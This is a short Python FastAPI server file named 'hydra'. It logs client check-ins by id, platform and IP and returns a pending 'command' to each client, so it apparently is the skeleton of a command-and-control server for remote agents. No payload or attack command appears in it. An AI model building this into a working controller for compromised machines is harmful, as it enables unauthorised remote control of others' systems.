from fastapi import FastAPI, Request
from contextlib import asynccontextmanager
from db import init_db, register_client

@asynccontextmanager
async def lifespan(app: FastAPI):
    # This runs when the server starts
    await init_db()
    yield
    # Cleanup logic goes here if needed

app = FastAPI(lifespan=lifespan)

@app.get("/")
async def status():
    return {"hydra": "online", "version": "1.0.0"}

@app.post("/checkin/{client_id}")
async def checkin(client_id: str, platform: str, request: Request):
    client_ip = request.client.host
    await register_client(client_id, platform, client_ip)
    return {"response": "acknowledged", "command": "wait"}